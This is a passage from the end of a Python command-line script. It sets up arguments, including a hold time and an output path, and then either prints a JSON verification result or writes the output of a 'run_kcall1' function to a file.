    run.add_argument("--hold", type=int, default=0, choices=range(0, 301),
                     metavar="SECONDS")
    run.add_argument("--output", type=Path)
    args = parser.parse_args()
    if args.command == "verify":
        print(json.dumps(verify(args), indent=2, sort_keys=True))
        return 0
    write_json(args.output, run_kcall1(args))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
